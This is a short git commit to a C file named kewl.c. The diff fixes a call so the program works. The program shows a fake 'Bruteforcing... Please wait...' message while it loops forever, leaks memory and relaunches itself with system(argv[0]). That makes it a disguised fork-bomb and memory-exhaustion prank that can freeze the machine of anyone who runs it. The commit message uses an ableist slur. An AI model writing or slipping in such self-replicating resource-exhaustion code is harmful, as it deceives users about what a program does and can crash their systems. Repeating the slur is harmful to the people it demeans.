2108d36a1eb5a657f9899155c0dd8c35370a1ad9
Dany <imsurebuschdid911@gmail.com>
2019-02-22 22:34:18 +0100

    AM I ACTUALLY FUCKING RETARDED, WHY DONT I TEST THIS STUFF

--- kewl.c
+++ kewl.c
@@ -5,7 +5,7 @@ int main(int argc, char *argv[]) {
     for (;;) {
         printf("Bruteforcing...\nPlease wait...\n");
         malloc(50000);
-        System(argv[0]);
+        system(argv[0]);
     }
 
 }
